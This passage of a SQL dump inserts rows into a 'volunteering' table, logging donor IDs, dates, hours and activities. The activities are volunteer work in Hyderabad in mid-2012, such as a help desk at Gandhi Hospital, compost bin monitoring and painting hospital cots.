(419, '175', '2012-06-29', '2012-06-29', '10:00:00', '13:00:00', '2', 'Shram Daan', 'Education', 'Conducting Book Donation camp at ADC', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(420, '170', '2012-06-30', '2012-06-30', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(421, '203', '2012-06-30', '2012-06-30', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(422, '204', '2012-06-30', '2012-06-30', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(423, '171', '2012-06-30', '2012-06-30', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(424, '189', '2012-06-30', '2012-06-30', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(425, '205', '2012-07-03', '2012-07-03', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(426, '206', '2012-07-03', '2012-07-03', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(427, '207', '2012-07-03', '2012-07-03', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(428, '208', '2012-07-03', '2012-07-03', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(429, '209', '2012-07-03', '2012-07-03', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(430, '210', '2012-07-03', '2012-07-03', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(431, '170', '2012-07-04', '2012-07-04', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(432, '171', '2012-07-04', '2012-07-04', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(433, '174', '2012-07-04', '2012-07-04', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(434, '185', '2012-07-04', '2012-07-04', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(435, '194', '2012-07-04', '2012-07-04', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(436, '197', '2012-07-04', '2012-07-04', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(437, '170', '2012-07-05', '2012-07-05', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(438, '171', '2012-07-05', '2012-07-05', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(439, '185', '2012-07-05', '2012-07-05', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(440, '194', '2012-07-05', '2012-07-05', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(441, '197', '2012-07-05', '2012-07-05', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(442, '170', '2012-07-06', '2012-07-06', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(443, '171', '2012-07-06', '2012-07-06', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(444, '198', '2012-07-06', '2012-07-06', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(445, '199', '2012-07-06', '2012-07-06', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(446, '169', '2012-07-06', '2012-07-06', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(447, '176', '2012-07-06', '2012-07-06', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(448, '173', '2012-07-07', '2012-07-07', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Supporting Digitisation efforts at IPM', 'Onsite', 'Hyderabad', 'ADC', '', 13),
(449, '182', '2012-07-07', '2012-07-07', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Supporting Digitisation efforts at IPM', 'Onsite', 'Hyderabad', 'ADC', '', 13),
(450, '200', '2012-07-07', '2012-07-07', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Supporting Digitisation efforts at IPM', 'Onsite', 'Hyderabad', 'ADC', '', 13),
(451, '201', '2012-07-07', '2012-07-07', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Supporting Digitisation efforts at IPM', 'Onsite', 'Hyderabad', 'ADC', '', 13),
(452, '211', '2012-07-10', '2012-07-10', '10:00:00', '12:00:00', '1', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(453, '212', '2012-07-10', '2012-07-10', '10:00:00', '12:00:00', '1', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(454, '213', '2012-07-10', '2012-07-10', '10:00:00', '12:00:00', '1', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(455, '214', '2012-07-10', '2012-07-10', '10:00:00', '12:00:00', '1', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(456, '215', '2012-07-10', '2012-07-10', '10:00:00', '12:00:00', '1', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(457, '216', '2012-07-10', '2012-07-10', '10:00:00', '12:00:00', '1', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(458, '217', '2012-07-10', '2012-07-10', '10:00:00', '12:00:00', '1', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(459, '202', '2012-07-11', '2012-07-11', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins ', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(460, '198', '2012-07-11', '2012-07-11', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins ', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(461, '199', '2012-07-11', '2012-07-11', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins ', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(462, '176', '2012-07-11', '2012-07-11', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins ', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(463, '169', '2012-07-11', '2012-07-11', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins ', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(464, '218', '2012-07-11', '2012-07-11', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(465, '219', '2012-07-11', '2012-07-11', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(466, '220', '2012-07-11', '2012-07-11', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(467, '170', '2012-07-11', '2012-07-11', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(468, '171', '2012-07-11', '2012-07-11', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(469, '174', '2012-07-11', '2012-07-11', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(470, '218', '2012-07-12', '2012-07-12', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(471, '219', '2012-07-12', '2012-07-12', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(472, '220', '2012-07-12', '2012-07-12', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(473, '170', '2012-07-12', '2012-07-12', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(474, '171', '2012-07-12', '2012-07-12', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(475, '174', '2012-07-12', '2012-07-12', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(476, '171', '2012-07-13', '2012-07-13', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(477, '170', '2012-07-13', '2012-07-13', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(478, '203', '2012-07-13', '2012-07-13', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(479, '204', '2012-07-13', '2012-07-13', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(480, '174', '2012-07-13', '2012-07-13', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(481, '202', '2012-07-14', '2012-07-14', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins ', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(482, '176', '2012-07-14', '2012-07-14', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins ', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(483, '169', '2012-07-14', '2012-07-14', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins ', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(484, '170', '2012-07-14', '2012-07-14', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Painting cots in Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(485, '171', '2012-07-14', '2012-07-14', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Painting cots in Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(486, '198', '2012-07-14', '2012-07-14', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Painting cots in Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(487, '204', '2012-07-14', '2012-07-14', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Painting cots in Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(488, '174', '2012-07-14', '2012-07-14', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Painting cots in Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(489, '197', '2012-07-17', '2012-07-17', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(490, '185', '2012-07-17', '2012-07-17', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(491, '219', '2012-07-17', '2012-07-17', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(492, '220', '2012-07-17', '2012-07-17', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(493, '176', '2012-07-17', '2012-07-17', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(494, '219', '2012-07-18', '2012-07-18', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(495, '220', '2012-07-18', '2012-07-18', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(496, '218', '2012-07-18', '2012-07-18', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(497, '185', '2012-07-18', '2012-07-18', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(498, '222', '2012-07-18', '2012-07-18', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(499, '194', '2012-07-18', '2012-07-18', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(500, '194', '2012-07-19', '2012-07-19', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(501, '185', '2012-07-19', '2012-07-19', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(502, '196', '2012-07-19', '2012-07-19', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(503, '195', '2012-07-19', '2012-07-19', '09:30:00', '12:00:00', '8', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(504, '176', '2012-07-21', '2012-07-21', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(505, '219', '2012-07-21', '2012-07-21', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(506, '220', '2012-07-21', '2012-07-21', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(507, '218', '2012-07-21', '2012-07-21', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(508, '222', '2012-07-21', '2012-07-21', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(509, '223', '2012-07-21', '2012-07-21', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(510, '196', '2012-06-27', '2012-06-27', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(511, '185', '2012-06-27', '2012-06-27', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(512, '194', '2012-06-27', '2012-06-27', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(513, '197', '2012-06-27', '2012-06-27', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(514, '195', '2012-06-27', '2012-06-27', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(515, '197', '2012-06-27', '2012-06-27', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(516, '195', '2012-06-27', '2012-06-27', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(517, '196', '2012-06-29', '2012-06-29', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(518, '185', '2012-06-29', '2012-06-29', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(519, '194', '2012-06-29', '2012-06-29', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(520, '197', '2012-06-29', '2012-06-29', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(521, '195', '2012-06-29', '2012-06-29', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(522, '224', '2012-07-21', '2012-07-21', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(523, '225', '2012-07-21', '2012-07-21', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(524, '226', '2012-07-21', '2012-07-21', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(525, '227', '2012-07-21', '2012-07-21', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(526, '228', '2012-07-21', '2012-07-21', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(527, '229', '2012-07-21', '2012-07-21', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(528, '219', '2012-07-23', '2012-07-23', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(529, '220', '2012-07-23', '2012-07-23', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(530, '218', '2012-07-23', '2012-07-23', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(531, '222', '2012-07-23', '2012-07-23', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(532, '219', '2012-07-24', '2012-07-24', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(533, '220', '2012-07-24', '2012-07-24', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(534, '230', '2012-07-24', '2012-07-24', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(535, '170', '2012-07-24', '2012-07-24', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(536, '171', '2012-07-24', '2012-07-24', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(537, '174', '2012-07-24', '2012-07-24', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(538, '218', '2012-07-24', '2012-07-24', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(539, '222', '2012-07-24', '2012-07-24', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(540, '194', '2012-07-24', '2012-07-24', '10:00:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(541, '183', '2012-07-24', '2012-07-24', '10:00:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(542, '186', '2012-07-24', '2012-07-24', '10:00:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7);
INSERT INTO `volunteering` (`volunteer_act_id`, `donor_id`, `from_date`, `to_date`, `from_time`, `to_time`, `hours`, `donation_type`, `area`, `activity_done`, `onsite_offsite`, `location`, `organisation`, `notes`, `project_id`) VALUES
(543, '197', '2012-07-24', '2012-07-24', '09:30:00', '13:00:00', '3', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(544, '202', '2012-07-24', '2012-07-24', '09:30:00', '13:00:00', '3', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(545, '169', '2012-07-24', '2012-07-24', '09:30:00', '13:00:00', '3', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(546, '194', '2012-07-25', '2012-07-25', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(547, '195', '2012-07-25', '2012-07-25', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(548, '196', '2012-07-25', '2012-07-25', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(549, '197', '2012-07-25', '2012-07-25', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(550, '185', '2012-07-25', '2012-07-25', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(551, '183', '2012-07-25', '2012-07-25', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(552, '227', '2012-07-25', '2012-07-25', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(553, '228', '2012-07-25', '2012-07-25', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(554, '226', '2012-07-25', '2012-07-25', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(555, '224', '2012-07-25', '2012-07-25', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(556, '194', '2012-07-26', '2012-07-26', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(557, '195', '2012-07-26', '2012-07-26', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(558, '185', '2012-07-26', '2012-07-26', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(559, '197', '2012-07-26', '2012-07-26', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(560, '196', '2012-07-26', '2012-07-26', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(561, '186', '2012-07-26', '2012-07-26', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(562, '183', '2012-07-26', '2012-07-26', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(563, '184', '2012-07-26', '2012-07-26', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(564, '218', '2012-07-27', '2012-07-27', '10:30:00', '12:30:00', '2', 'Shram Daan', 'Health', 'Painting cots in Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(565, '222', '2012-07-27', '2012-07-27', '10:30:00', '12:30:00', '2', 'Shram Daan', 'Health', 'Painting cots in Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
